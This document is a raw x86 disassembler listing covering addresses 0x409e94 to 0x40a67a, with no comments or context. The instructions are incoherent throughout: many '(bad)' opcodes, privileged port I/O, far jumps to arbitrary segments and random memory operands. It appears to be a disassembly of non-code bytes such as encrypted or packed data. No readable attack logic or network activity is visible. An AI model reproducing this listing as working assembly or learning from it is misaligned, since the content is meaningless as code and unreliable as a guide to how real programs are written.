  409e94:	stc    
  409e95:	ret    0x30e7
  409e98:	sub    ebp,edi
  409e9a:	push   ds
  409e9b:	fld    st(7)
  409e9d:	lea    edi,[ebp+0x5e90cf96]
  409ea3:	fistp  DWORD PTR [edi]
  409ea5:	adc    edx,eax
  409ea7:	not    DWORD PTR [esi+0x625efb05]
  409ead:	mov    esp,0x915814c5
  409eb2:	daa    
  409eb3:	add    BYTE PTR [eax],0xfc
  409eb6:	mov    bh,0x35
  409eb8:	fbstp  TBYTE PTR ds:0x162ee01d
  409ebe:	aaa    
  409ebf:	clc    
  409ec0:	dec    eax
  409ec1:	shr    ebx,1
  409ec3:	pop    ecx
  409ec4:	pop    eax
  409ec5:	add    BYTE PTR [ecx+esi*4-0x40],0xb3
  409eca:	xchg   edx,eax
  409ecb:	mov    ds:0x345c36ce,al
  409ed0:	pop    ebp
  409ed1:	cmc    
  409ed2:	push   ecx
  409ed3:	sub    cl,0xf1
  409ed6:	jmp    0x8d7:0x2bc22639
  409edd:	ret    
  409ede:	adc    al,al
  409ee0:	(bad)  
  409ee1:	push   ss
  409ee2:	pop    ebx
  409ee3:	cmp    eax,0x7f003349
  409ee8:	fild   QWORD PTR [edi+0x78]
  409eeb:	popa   
  409eec:	push   es
  409eed:	jge    0x409f52
  409eef:	mov    ds:0xe71ab5ce,al
  409ef4:	inc    ecx
  409ef5:	repz inc edi
  409ef7:	push   ds
  409ef8:	or     al,0x60
  409efa:	mov    edi,0x1e758333
  409eff:	pushf  
  409f00:	jno    0x409eeb
  409f02:	dec    edx
  409f03:	dec    ebx
  409f04:	inc    BYTE PTR cs:[eax]
  409f07:	stc    
  409f08:	or     BYTE PTR [eax+0x73],bh
  409f0b:	out    dx,al
  409f0c:	push   0xffffffd9
  409f0e:	adc    DWORD PTR [ebp+0x12c05996],esp
  409f14:	mov    bh,al
  409f16:	das    
  409f17:	pop    ecx
  409f18:	cli    
  409f19:	sub    DWORD PTR [edx],eax
  409f1b:	in     eax,dx
  409f1c:	cmc    
  409f1d:	js     0x409f7a
  409f1f:	jno    0x409f82
  409f21:	and    BYTE PTR [edx],al
  409f23:	aam    0xae
  409f25:	mov    ch,0x45
  409f27:	pop    edx
  409f28:	shr    BYTE PTR [esi+0x45],0x9d
  409f2c:	ret    
  409f2d:	adc    al,0xa3
  409f2f:	rol    DWORD PTR [ecx],0xb4
  409f32:	jne    0x409efa
  409f34:	jo     0x409fa5
  409f36:	xchg   esp,eax
  409f37:	enter  0x673,0x61
  409f3b:	aas    
  409f3c:	and    DWORD PTR [ebx+0x12],0x73733919
  409f43:	mov    ah,0x4f
  409f45:	sub    al,0x7b
  409f47:	scas   al,BYTE PTR es:[edi]
  409f48:	or     BYTE PTR [eax-0x1c],0x9e
  409f4c:	xchg   esp,eax
  409f4d:	jg     0x409f5f
  409f4f:	mov    dh,0x6f
  409f51:	jge    0x409f01
  409f53:	mov    al,0x98
  409f55:	lds    ecx,FWORD PTR ds:0x201b5521
  409f5b:	add    BYTE PTR [eax-0xeb44663],ch
  409f61:	repz add ecx,DWORD PTR [esi+0x109fa0a9]
  409f68:	xchg   ebx,eax
  409f69:	cmp    ebx,DWORD PTR [edx-0x33]
  409f6c:	ret    
  409f6d:	dec    esi
  409f6e:	push   cs
  409f6f:	pop    es
  409f70:	lods   al,BYTE PTR ds:[esi]
  409f71:	push   0x41494ad5
  409f76:	dec    edx
  409f77:	xlat   BYTE PTR ds:[ebx]
  409f78:	ss stos BYTE PTR es:[edi],al
  409f7a:	loope  0x409f41
  409f7c:	jbe    0x409f41
  409f7e:	aas    
  409f7f:	sub    al,0xf0
  409f81:	aad    0x6a
  409f83:	pop    esp
  409f84:	fidivr DWORD PTR [edx+0x29]
  409f87:	mov    DWORD PTR [ecx-0x15],edi
  409f8a:	xchg   ebx,eax
  409f8b:	jbe    0x409fdd
  409f8d:	xor    bl,BYTE PTR ds:0x3f54fe29
  409f93:	mov    BYTE PTR cs:[ebx+0xaf4af2c],dl
  409f9a:	jb     0x409f3c
  409f9c:	xlat   BYTE PTR ds:[ebx]
  409f9d:	or     al,bl
  409f9f:	xchg   edx,eax
  409fa0:	pop    es
  409fa1:	mov    cl,0xa7
  409fa3:	sub    al,0x97
  409fa5:	push   esi
  409fa6:	into   
  409fa7:	dec    ecx
  409fa8:	hlt    
  409fa9:	pop    esp
  409faa:	gs jmp 0x409f83
  409fad:	mov    dh,0xdc
  409faf:	xchg   esi,eax
  409fb0:	out    0x8d,al
  409fb2:	push   eax
  409fb3:	repnz data16 ds aad 0x32
  409fb8:	rcr    BYTE PTR [ebx+0x78530ff0],1
  409fbe:	xor    BYTE PTR [ecx+eax*1],ah
  409fc1:	test   al,0x25
  409fc3:	xchg   DWORD PTR gs:[eax+0x1b18e0d7],edx
  409fca:	or     DWORD PTR [ecx-0x28847ba9],0x4f4aed
  409fd4:	ret    
  409fd5:	lahf   
  409fd6:	div    ch
  409fd8:	jno    0x40a058
  409fda:	xchg   edx,eax
  409fdb:	imul   ebx,DWORD PTR [edi-0x1e],0x7efd6384
  409fe2:	jmp    0x2734ef37
  409fe7:	inc    eax
  409fe8:	jne    0x409f8c
  409fea:	shl    BYTE PTR [ebx+ebx*1],0x74
  409fee:	add    ebp,edx
  409ff0:	int    0xf0
  409ff2:	inc    edi
  409ff3:	sahf   
  409ff4:	gs jb  0x409fff
  409ff7:	pop    ebp
  409ff8:	repz or DWORD PTR [ebp+0x147de3a9],0xffffffd4
  40a000:	lds    eax,FWORD PTR [edx+0x42]
  40a003:	rol    DWORD PTR [ecx+0x6c],cl
  40a006:	inc    esi
  40a007:	icebp  
  40a008:	xchg   edx,eax
  40a009:	jge    0x40a088
  40a00b:	sahf   
  40a00c:	out    0x3b,eax
  40a00e:	pop    ss
  40a00f:	pop    eax
  40a010:	imul   esi,DWORD PTR [esi],0x1b
  40a013:	pushw  cs
  40a015:	aas    
  40a016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a017:	pop    esp
  40a018:	lock or edx,DWORD PTR [edx+0x2a]
  40a01c:	loope  0x40a01f
  40a01e:	cli    
  40a01f:	stos   BYTE PTR es:[edi],al
  40a020:	ss call 0x3bc9598
  40a026:	jb     0x40a090
  40a028:	test   ebp,edx
  40a02a:	rcr    BYTE PTR [edx+edi*1+0x652d5f00],cl
  40a031:	es pop ebp
  40a033:	repnz pop eax
  40a035:	push   cs
  40a036:	xchg   ecx,eax
  40a037:	mov    al,ds:0x9d0f2439
  40a03c:	sar    DWORD PTR [eax-0x25],0xdd
  40a040:	adc    bh,BYTE PTR [edi]
  40a042:	call   0x37ad:0x9581583a
  40a049:	xchg   BYTE PTR [ebx+ebp*1-0x5f98b129],al
  40a050:	jb     0x409ffe
  40a052:	scas   al,BYTE PTR es:[edi]
  40a053:	mov    al,ds:0xfbb39903
  40a058:	push   ds
  40a059:	cmp    DWORD PTR [ebx],ebx
  40a05b:	mov    WORD PTR [ebx+ecx*4+0xa],gs
  40a05f:	int    0x4d
  40a061:	dec    edi
  40a062:	shr    DWORD PTR [ebp+0x11d56e1a],0x35
  40a069:	xchg   edx,eax
  40a06a:	inc    edx
  40a06b:	in     eax,0x69
  40a06d:	mov    edx,edx
  40a06f:	cmp    BYTE PTR [ebp-0x1b],bl
  40a072:	ins    DWORD PTR es:[edi],dx
  40a073:	mov    ch,BYTE PTR [edx]
  40a075:	sti    
  40a076:	arpl   WORD PTR cs:[edi-0x745969a5],si
  40a07d:	dec    ebp
  40a07e:	ret    
  40a07f:	push   ecx
  40a080:	adc    al,0x4f
  40a082:	addr16 cmp esi,esp
  40a085:	inc    esi
  40a086:	shr    DWORD PTR [edi],1
  40a088:	dec    esp
  40a089:	(bad)  
  40a08a:	sbb    DWORD PTR [edi],ebp
  40a08c:	(bad)  
  40a08d:	mov    edx,0xb0a2f7e8
  40a092:	(bad)  
  40a093:	fcmovb st,st(6)
  40a095:	push   edx
  40a096:	xchg   DWORD PTR [ecx-0x1681c263],esi
  40a09c:	(bad)  
  40a09d:	mov    ch,0x77
  40a09f:	fsub   DWORD PTR [edx+0x6e]
  40a0a2:	and    eax,0x16ee1c4c
  40a0a7:	retf   
  40a0a8:	js     0x40a071
  40a0aa:	add    DWORD PTR [ecx+esi*8+0x1f],esi
  40a0ae:	or     ah,dh
  40a0b0:	add    BYTE PTR ds:0x4960b88d,bh
  40a0b6:	jp     0x40a0e1
  40a0b8:	add    ch,BYTE PTR [edi+0x3fb9746c]
  40a0be:	jne    0x40a07c
  40a0c0:	mov    al,0xd8
  40a0c2:	or     ebx,DWORD PTR [eax-0x4d]
  40a0c5:	xchg   ecx,eax
  40a0c6:	call   0x3ba8:0xa08181f6
  40a0cd:	mov    bh,0x14
  40a0cf:	sub    eax,0x8d6da73e
  40a0d4:	mov    ebp,0xbca420a6
  40a0d9:	jnp    0x40a077
  40a0db:	sbb    BYTE PTR [edx-0x72d9ff7c],cl
  40a0e1:	mov    bl,0xaf
  40a0e3:	adc    al,0xc7
  40a0e5:	sbb    esp,DWORD PTR [ecx-0x3045f33d]
  40a0eb:	add    cl,BYTE PTR [edi]
  40a0ed:	push   ss
  40a0ee:	mov    bh,0xe9
  40a0f0:	sub    edi,ecx
  40a0f2:	xchg   edi,eax
  40a0f3:	(bad)  
  40a0f4:	out    0xb8,eax
  40a0f6:	lahf   
  40a0f7:	xchg   edi,eax
  40a0f8:	mov    ch,0xd8
  40a0fa:	and    BYTE PTR [ebp-0x6],al
  40a0fd:	mov    ecx,0x6a58cf6e
  40a102:	(bad)  
  40a103:	imul   esp,DWORD PTR [eax+0x3e385d5a],0xf687d673
  40a10d:	dec    eax
  40a10e:	push   es
  40a10f:	pop    DWORD PTR [ebx-0x5961f4c]
  40a115:	std    
  40a116:	mov    dl,BYTE PTR [ebx-0x10]
  40a119:	jb     0x40a109
  40a11b:	clc    
  40a11c:	aam    0x27
  40a11e:	out    dx,eax
  40a11f:	lea    ecx,[edx]
  40a121:	sti    
  40a122:	aam    0x38
  40a124:	xchg   edx,eax
  40a125:	adc    edi,DWORD PTR [ecx]
  40a127:	cmp    bl,BYTE PTR [ebp-0x3c]
  40a12a:	xchg   edx,eax
  40a12b:	lods   eax,DWORD PTR ds:[esi]
  40a12c:	pop    ebx
  40a12d:	or     esp,DWORD PTR [edi+eiz*1]
  40a130:	sub    ebp,DWORD PTR [ecx-0x38621dfb]
  40a136:	push   eax
  40a137:	cmp    ah,al
  40a139:	into   
  40a13a:	pop    es
  40a13b:	xchg   ebp,eax
  40a13c:	and    BYTE PTR [ebp+ebx*1-0x9a9aae7],dl
  40a143:	pushf  
  40a144:	dec    eax
  40a145:	push   ecx
  40a146:	gs xchg edx,eax
  40a148:	bound  ebx,QWORD PTR [edx+0x7c0af94f]
  40a14e:	call   DWORD PTR [ebx]
  40a150:	inc    esp
  40a151:	sub    eax,DWORD PTR [ebx]
  40a153:	(bad)  [eax+ebx*1]
  40a156:	mov    cl,0x81
  40a158:	out    dx,eax
  40a159:	inc    edx
  40a15a:	xchg   ebp,eax
  40a15b:	xor    esp,ebp
  40a15d:	sbb    bl,BYTE PTR [ecx]
  40a15f:	shr    DWORD PTR [edx+ebp*2+0x30],cl
  40a163:	adc    BYTE PTR [ebx+0x4309819b],ch
  40a169:	xor    esi,edi
  40a16b:	js     0x40a19b
  40a16d:	mov    edi,0x83a3012f
  40a172:	push   edi
  40a173:	test   eax,0xb6618f54
  40a178:	dec    edi
  40a179:	mov    ?,WORD PTR [ebx-0x45]
  40a17c:	mov    ebx,0xa7ffc51c
  40a181:	hlt    
  40a182:	les    esi,FWORD PTR [edx+0x4a3eab5a]
  40a188:	sti    
  40a189:	sub    bl,cl
  40a18b:	mov    edi,esp
  40a18d:	lods   eax,DWORD PTR ds:[esi]
  40a18e:	pop    ds
  40a18f:	imul   esp,DWORD PTR [ecx-0x9],0xffffffd4
  40a193:	sbb    eax,0x40ef42d6
  40a198:	stos   BYTE PTR es:[edi],al
  40a199:	sbb    eax,0xfb952a36
  40a19e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a19f:	mov    eax,ds:0x64c3e0
  40a1a4:	mov    ds:0xfedbea82,al
  40a1a9:	rcr    BYTE PTR [edi],1
  40a1ab:	stos   BYTE PTR es:[edi],al
  40a1ac:	adc    dh,BYTE PTR [eax-0x67275dc1]
  40a1b2:	jl     0x40a225
  40a1b4:	push   ds
  40a1b5:	cmp    al,0xc9
  40a1b7:	bound  eax,QWORD PTR [ecx]
  40a1b9:	xor    al,BYTE PTR [ecx]
  40a1bb:	pop    ebx
  40a1bc:	sbb    esp,esi
  40a1be:	adc    ah,BYTE PTR [eax-0x5b]
  40a1c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1c2:	test   al,0x3d
  40a1c4:	imul   esi,DWORD PTR ds:[edi],0xffffffa8
  40a1c8:	(bad)  
  40a1c9:	and    DWORD PTR [esi-0x74],edx
  40a1cc:	pop    edi
  40a1cd:	cmp    BYTE PTR [ecx],dh
  40a1cf:	jnp    0x40a15f
  40a1d1:	icebp  
  40a1d2:	in     al,dx
  40a1d3:	fdivr  DWORD PTR [esi]
  40a1d5:	imul   edx,DWORD PTR [edx],0xcca67137
  40a1db:	mov    ds:0x6d5a5bf7,al
  40a1e0:	mov    dl,0xbf
  40a1e2:	and    bl,dh
  40a1e4:	mov    ah,0x8
  40a1e6:	ret    
  40a1e7:	push   es
  40a1e8:	(bad)  
  40a1e9:	lea    ebp,ds:0xdbe81fa8
  40a1ef:	jae    0x40a187
  40a1f1:	(bad)  
  40a1f3:	xchg   ecx,eax
  40a1f4:	(bad)  [esi+edi*8-0x52e9bbde]
  40a1fb:	ret    0x5db
  40a1fe:	jne    0x40a1f5
  40a200:	cdq    
  40a201:	test   DWORD PTR ds:0x7fa2e00b,0x4eb33acc
  40a20b:	lea    ebx,[esi]
  40a20d:	cmp    al,0xd5
  40a20f:	cmp    eax,0x42207577
  40a214:	mov    bl,0x91
  40a216:	push   cs
  40a217:	mov    ?,WORD PTR [ecx-0x26]
  40a21a:	outs   dx,DWORD PTR ds:[esi]
  40a21b:	pop    edi
  40a21c:	mov    esi,0x4e1f5a27
  40a221:	std    
  40a222:	call   0x20a62c72
  40a227:	rcr    DWORD PTR [ecx+ebp*1+0x76],0x2a
  40a22c:	out    0xf8,eax
  40a22e:	dec    edi
  40a22f:	or     esp,ecx
  40a231:	jg     0x40a254
  40a233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a234:	cmp    BYTE PTR [eax+ecx*8+0x6d],0xe3
  40a239:	and    DWORD PTR fs:[eax],esi
  40a23c:	xchg   ebp,eax
  40a23d:	sbb    eax,DWORD PTR [ecx-0x6119c635]
  40a243:	and    ecx,DWORD PTR [edi+0x6b]
  40a246:	mov    dl,0xa
  40a248:	int3   
  40a249:	pop    eax
  40a24a:	jle    0x40a1e7
  40a24c:	jl     0x40a2af
  40a24e:	adc    BYTE PTR [ebx-0x65],al
  40a251:	js     0x40a1ef
  40a253:	adc    al,BYTE PTR es:[esi+0x638917e7]
  40a25a:	pop    ebp
  40a25b:	push   esi
  40a25c:	jno    0x40a27b
  40a25e:	out    0x70,eax
  40a260:	pushf  
  40a261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a262:	adc    DWORD PTR [esi+ecx*4],ebp
  40a265:	xchg   ebp,eax
  40a266:	mov    ds:0x263aa8fa,al
  40a26b:	pop    ebx
  40a26c:	outs   dx,BYTE PTR ds:[esi]
  40a26d:	jecxz  0x40a2be
  40a26f:	sbb    esi,ebx
  40a271:	inc    edx
  40a272:	jbe    0x40a22e
  40a274:	div    edi
  40a276:	jns    0x40a2e3
  40a278:	add    BYTE PTR [edi+0x5e61fd9c],bh
  40a27e:	(bad)
  40a282:	jmp    0x40a2b6
  40a284:	xchg   edx,eax
  40a285:	ins    BYTE PTR es:[edi],dx
  40a286:	imul   DWORD PTR [ebx+0x19]
  40a289:	je     0x40a2da
  40a28b:	inc    esi
  40a28c:	mov    BYTE PTR [edi-0x1de7e2a8],dl
  40a292:	jmp    0x99752351
  40a297:	and    DWORD PTR [ebp+0x54057090],ebx
  40a29d:	inc    ebp
  40a29e:	mov    edi,0x3319ea21
  40a2a3:	repnz inc esi
  40a2a5:	inc    edx
  40a2a6:	scas   eax,DWORD PTR es:[edi]
  40a2a7:	mov    cl,cl
  40a2a9:	retf   
  40a2aa:	cld    
  40a2ab:	mov    dh,0xf9
  40a2ad:	cmp    BYTE PTR [edx+0x6a],cl
  40a2b0:	xchg   ebx,eax
  40a2b1:	(bad)
  40a2b4:	mov    al,ds:0x2dcf4282
  40a2b9:	ja     0x40a2c9
  40a2bb:	ret    
  40a2bc:	rcr    DWORD PTR [ebp-0x1e534490],1
  40a2c2:	bound  ebp,QWORD PTR [ecx]
  40a2c4:	jnp    0x40a25e
  40a2c6:	or     BYTE PTR [eax+edx*1],bl
  40a2c9:	xor    bl,BYTE PTR [edx-0x57b57bb2]
  40a2cf:	and    ah,bl
  40a2d1:	mov    bh,0x60
  40a2d3:	lods   al,BYTE PTR ds:[esi]
  40a2d4:	retf   0x1a14
  40a2d7:	push   ebx
  40a2d8:	push   ds
  40a2d9:	adc    BYTE PTR [ecx-0x76b586dd],0x4f
  40a2e0:	out    dx,al
  40a2e1:	sub    al,0xd4
  40a2e3:	cmp    DWORD PTR [eax],0xb73b7d17
  40a2e9:	jbe    0x40a32f
  40a2eb:	pop    ebp
  40a2ec:	leave  
  40a2ed:	fcmovb st,st(5)
  40a2ef:	jnp    0x40a30e
  40a2f1:	dec    edi
  40a2f2:	fisttp QWORD PTR [ebx]
  40a2f4:	dec    eax
  40a2f5:	ds xor eax,0x71cf242f
  40a2fb:	cmovae ebx,DWORD PTR [edx]
  40a2fe:	xor    BYTE PTR [ecx+eiz*4-0x12e4713d],cl
  40a305:	mov    esp,0xdc37df45
  40a30a:	les    ebp,FWORD PTR ds:0xee52f98
  40a310:	add    al,0xff
  40a312:	lods   al,BYTE PTR ds:[esi]
  40a313:	xchg   ecx,eax
  40a314:	add    DWORD PTR [ecx],ebx
  40a316:	cwde   
  40a317:	pop    edi
  40a318:	mov    BYTE PTR es:[edx-0x56],ah
  40a31c:	in     al,dx
  40a31d:	adc    edx,DWORD PTR [eax+0x77c5e7a7]
  40a323:	fisttp QWORD PTR [ebp+0x10ce8bce]
  40a329:	call   0xafa00992
  40a32e:	fnsave [eax-0x13833a12]
  40a334:	inc    ecx
  40a335:	xchg   ebp,eax
  40a336:	mov    ebx,0x9e90e72d
  40a33b:	sub    esi,DWORD PTR [esp+ebx*1-0x51b28866]
  40a342:	hlt    
  40a343:	arpl   sp,bp
  40a345:	int3   
  40a346:	fs addr16 cmp eax,0xd0103494
  40a34d:	jns    0x40a324
  40a34f:	push   ebx
  40a350:	xchg   esi,eax
  40a351:	push   ss
  40a352:	cmp    al,0x53
  40a354:	iret   
  40a355:	mov    esi,0x4b189635
  40a35a:	mov    ecx,0x191dc61b
  40a35f:	adc    eax,edx
  40a361:	sub    eax,0x442e4b03
  40a366:	dec    ecx
  40a367:	std    
  40a368:	inc    edi
  40a369:	imul   eax,DWORD PTR [ebx+ecx*1+0x74f25a9f],0x42
  40a371:	pop    edx
  40a372:	je     0x40a368
  40a374:	push   cs
  40a375:	mov    esi,0xf49bd246
  40a37a:	inc    edx
  40a37b:	push   ebx
  40a37c:	mov    bh,0xb4
  40a37e:	ret    
  40a37f:	jmp    0xf3d016
  40a384:	inc    esp
  40a385:	mov    ds:0xb7722b67,al
  40a38a:	(bad)  
  40a38b:	retf   
  40a38c:	push   cs
  40a38d:	repnz scas al,BYTE PTR es:[edi]
  40a38f:	sbb    ch,cl
  40a391:	push   ss
  40a392:	mov    edi,0x6120fc1e
  40a397:	xchg   BYTE PTR [edi-0x1fa386a],dl
  40a39d:	xchg   esi,eax
  40a39e:	or     DWORD PTR [eax],edi
  40a3a0:	mov    ah,BYTE PTR [ebx-0x185ac41b]
  40a3a6:	mov    ds:0x6e3d9ed7,eax
  40a3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3ac:	pop    edi
  40a3ad:	rcl    esi,1
  40a3af:	ins    BYTE PTR es:[edi],dx
  40a3b0:	(bad)  
  40a3b1:	xchg   esi,eax
  40a3b2:	ror    BYTE PTR [edi],1
  40a3b4:	fadd   QWORD PTR [ecx+0x56]
  40a3b7:	loop   0x40a41e
  40a3b9:	mov    edi,0xed51f12e
  40a3be:	xchg   ecx,eax
  40a3bf:	shl    DWORD PTR ds:0xce2815a6,cl
  40a3c5:	push   edx
  40a3c6:	fnstenv [esi+ecx*2]
  40a3c9:	mov    bl,0x26
  40a3cb:	sbb    DWORD PTR fs:[esi],esi
  40a3ce:	ret    
  40a3cf:	mov    ebp,0x2e57a4a1
  40a3d4:	xchg   DWORD PTR [edx+0xb],eax
  40a3d7:	loopne 0x40a417
  40a3d9:	sahf   
  40a3da:	mov    edx,0x171575a7
  40a3df:	pop    ebp
  40a3e0:	lds    esp,FWORD PTR [ebx]
  40a3e2:	mov    cl,0x78
  40a3e4:	jno    0x40a414
  40a3e6:	mov    eax,ds:0xc86dd24f
  40a3eb:	icebp  
  40a3ec:	push   ebp
  40a3ed:	mov    edi,edi
  40a3ef:	xor    DWORD PTR [ebx+0x4e2eb2a4],esp
  40a3f5:	pop    edi
  40a3f6:	xchg   ebp,eax
  40a3f7:	push   ss
  40a3f8:	mov    bh,0xc2
  40a3fa:	dec    ebp
  40a3fb:	sbb    cl,BYTE PTR [ebx+ebp*4+0x3b]
  40a3ff:	and    eax,esi
  40a401:	int3   
  40a402:	xchg   ebp,eax
  40a403:	test   eax,0x166add90
  40a408:	cli    
  40a409:	test   DWORD PTR [edi-0x60],esp
  40a40c:	mov    ?,WORD PTR [edx+0x30]
  40a40f:	mov    eax,0xa34b16a
  40a414:	or     BYTE PTR [ecx],ah
  40a416:	mov    dl,0x26
  40a418:	xor    eax,0x5c9a016e
  40a41d:	sub    ebp,0x85178377
  40a423:	fwait
  40a424:	(bad)  
  40a425:	aad    0xe5
  40a427:	movaps XMMWORD PTR [ecx-0x34],xmm0
  40a42b:	jae    0x40a3ea
  40a42d:	rcl    DWORD PTR [esi+0x6a3160ac],0x75
  40a434:	rdtsc  
  40a436:	je     0x40a488
  40a438:	xor    ah,BYTE PTR [edi]
  40a43a:	into   
  40a43b:	or     ebx,DWORD PTR [esi]
  40a43d:	push   ebx
  40a43e:	fldcw  WORD PTR [ecx+0x593b5e23]
  40a444:	xor    eax,0xfbf429f9
  40a449:	aas    
  40a44a:	xchg   esp,eax
  40a44b:	cmp    eax,DWORD PTR [esi+ebp*8+0x74]
  40a44f:	es cld 
  40a451:	pop    esp
  40a452:	xchg   esp,eax
  40a453:	outs   dx,BYTE PTR ds:[esi]
  40a454:	and    al,0x2d
  40a456:	mov    ebp,0xa651326c
  40a45b:	lahf   
  40a45c:	cld    
  40a45d:	pop    esi
  40a45e:	mov    ecx,0x59cca78
  40a463:	stc    
  40a464:	imul   ebx,DWORD PTR [esi+0x1f49275a],0x62
  40a46b:	mov    ebp,0x5988038f
  40a470:	shr    DWORD PTR [eax],1
  40a472:	xchg   esp,eax
  40a473:	push   ebx
  40a474:	pop    es
  40a475:	(bad)  
  40a476:	rcl    BYTE PTR [ebx],1
  40a478:	xor    al,0xa4
  40a47a:	jge    0x40a4eb
  40a47c:	add    eax,0xa5b37d21
  40a481:	inc    ebp
  40a482:	das    
  40a483:	(bad)  
  40a484:	ins    BYTE PTR es:[edi],dx
  40a485:	mov    dl,0xa1
  40a487:	xchg   ebp,eax
  40a488:	popa   
  40a489:	int3   
  40a48a:	push   0x5d
  40a48c:	jge    0x40a4b7
  40a48e:	sti    
  40a48f:	sbb    eax,0x4f4c54c2
  40a494:	enter  0x5eb3,0x6
	...
  40a514:	adc    eax,0x96f91681
  40a519:	(bad)  
  40a51a:	(bad)  
  40a51b:	in     eax,dx
  40a51c:	push   eax
  40a51d:	scas   eax,DWORD PTR es:[edi]
  40a51e:	(bad)  
  40a51f:	jp     0x40a4f1
  40a521:	push   0x57556497
  40a526:	add    BYTE PTR [eax],al
  40a528:	ins    BYTE PTR es:[edi],dx
  40a529:	pop    es
  40a52a:	add    BYTE PTR [eax],al
  40a52c:	aas    
  40a52d:	rcl    cl,1
  40a52f:	xchg   edx,eax
  40a530:	pop    esp
  40a531:	jno    0x40a52a
  40a533:	(bad)  
  40a534:	lods   al,BYTE PTR ds:[esi]
  40a535:	mov    ah,BYTE PTR [esi]
  40a537:	pop    edi
  40a538:	bound  esi,QWORD PTR [edi]
  40a53a:	mov    ch,0xc0
  40a53c:	or     BYTE PTR [esi+edx*1+0xe9ccf4],0xa0
  40a544:	je     0x40a4e0
  40a546:	xor    eax,0x75041a0e
  40a54b:	test   al,0xae
  40a54d:	xchg   esi,eax
  40a54e:	dec    edi
  40a54f:	jbe    0x40a5ab
  40a551:	in     eax,0xa9
  40a553:	mov    esi,0xf94126c2
  40a558:	outs   dx,DWORD PTR ds:[esi]
  40a559:	in     eax,dx
  40a55a:	mov    al,0xa4
  40a55c:	lea    ebx,[ebx+0x42cf0b13]
  40a562:	jge    0x40a59c
  40a564:	enter  0x6287,0x7a
  40a568:	out    0x9c,eax
  40a56a:	into   
  40a56b:	cmc    
  40a56c:	paddq  mm5,QWORD PTR [eax]
  40a56f:	dec    ebp
  40a570:	sar    DWORD PTR [eax+0x3e],1
  40a573:	add    al,0xc5
  40a575:	daa    
  40a576:	pushf  
  40a577:	loopne 0x40a5df
  40a579:	add    al,0xb
  40a57b:	xchg   ebp,eax
  40a57c:	in     eax,dx
  40a57d:	rcr    esp,cl
  40a57f:	pop    es
  40a580:	cmp    al,0x28
  40a582:	cmp    DWORD PTR [esi],eax
  40a584:	push   ebx
  40a585:	pop    ebp
  40a586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a587:	loopne 0x40a5d7
  40a589:	repnz rol dh,0x9
  40a58d:	fwait
  40a58e:	dec    esp
  40a58f:	pop    ebp
  40a590:	inc    esp
  40a591:	call   0x60ae43a6
  40a596:	(bad)  
  40a597:	dec    esp
  40a598:	xchg   ecx,eax
  40a599:	daa    
  40a59a:	scas   al,BYTE PTR es:[edi]
  40a59b:	mov    bh,0x81
  40a59d:	int3   
  40a59e:	imul   ebp,DWORD PTR [esi-0x4a],0x1f
  40a5a2:	sbb    al,0x2c
  40a5a4:	jnp    0x40a58d
  40a5a6:	neg    BYTE PTR [esp+edi*4]
  40a5a9:	dec    eax
  40a5aa:	cs jl  0x40a5d4
  40a5ad:	push   eax
  40a5ae:	data16 clc 
  40a5b0:	sub    al,0xd0
  40a5b2:	add    ebx,ebx
  40a5b4:	mov    esp,0xb2365fb3
  40a5b9:	push   ecx
  40a5ba:	mov    BYTE PTR [edx*2-0x74632495],dl
  40a5c1:	mov    edx,0xd2707980
  40a5c6:	shr    DWORD PTR [edi+edi*1+0x25],1
  40a5ca:	inc    esi
  40a5cb:	and    BYTE PTR [eax+eax*8],bh
  40a5ce:	imul   ebp,DWORD PTR ss:[edx],0x1c8c192d
  40a5d5:	(bad)  
  40a5d6:	fidiv  DWORD PTR [eax-0x8059f1b]
  40a5dc:	aas    
  40a5dd:	ror    DWORD PTR [ebp+0x678b6448],cl
  40a5e3:	repnz pop ebx
  40a5e5:	mov    WORD PTR [ebx],fs
  40a5e7:	out    0xd2,al
  40a5e9:	jge    0x40a61c
  40a5eb:	je     0x40a5e0
  40a5ed:	into   
  40a5ee:	dec    ebx
  40a5ef:	aas    
  40a5f0:	int3   
  40a5f1:	jno    0x40a668
  40a5f3:	data16 aam 0xa1
  40a5f6:	scas   eax,DWORD PTR es:[edi]
  40a5f7:	or     ebp,DWORD PTR [eax+0x1d]
  40a5fa:	repz ss and eax,0xcd4ca8dc
  40a601:	out    0xd4,al
  40a603:	sti    
  40a604:	xor    bl,ch
  40a606:	push   edx
  40a607:	jno    0x40a58e
  40a609:	xchg   BYTE PTR [eax],dh
  40a60b:	clc    
  40a60c:	xchg   esp,eax
  40a60d:	jecxz  0x40a5b3
  40a60f:	out    0x5e,eax
  40a611:	pop    eax
  40a612:	fcomp  QWORD PTR [esi-0x527ebc63]
  40a618:	or     dh,bl
  40a61a:	xchg   edx,eax
  40a61b:	xor    edx,DWORD PTR [edi-0x3b]
  40a61e:	pop    edx
  40a61f:	and    ah,BYTE PTR [edx-0x16]
  40a622:	leave  
  40a623:	rcr    DWORD PTR [ecx+0x21],cl
  40a626:	cs jbe 0x40a654
  40a629:	arpl   sp,bp
  40a62b:	mov    ds:0x57313e37,al
  40a630:	mov    esi,0x5d78e648
  40a635:	ret    
  40a636:	adc    DWORD PTR [edx+0xc],edx
  40a639:	test   eax,0x5d540d03
  40a63e:	(bad)  
  40a63f:	and    ebp,DWORD PTR [ecx]
  40a641:	div    ebp
  40a643:	jnp    0x40a5f1
  40a645:	mov    eax,0x4551edff
  40a64a:	in     eax,dx
  40a64b:	lock mov ah,0x17
  40a64e:	xchg   esp,eax
  40a64f:	mov    al,bl
  40a651:	dec    ebp
  40a652:	cdq    
  40a653:	(bad)  
  40a654:	cmp    cl,al
  40a656:	or     DWORD PTR ds:0xcd20bedc,0xffffff8d
  40a65d:	shl    edi,1
  40a65f:	and    BYTE PTR [ebx-0x11b5e0fa],dh
  40a665:	dec    ebx
  40a666:	popf   
  40a667:	xchg   ecx,eax
  40a668:	lds    esp,FWORD PTR [ecx+eiz*1+0x8a66fc6]
  40a66f:	int    0x35
  40a671:	int3   
  40a672:	push   eax
  40a673:	push   es
  40a674:	mov    al,ds:0x8d8c2721
  40a679:	outs   dx,BYTE PTR ds:[esi]
  40a67a:	jge    0x40a6f1
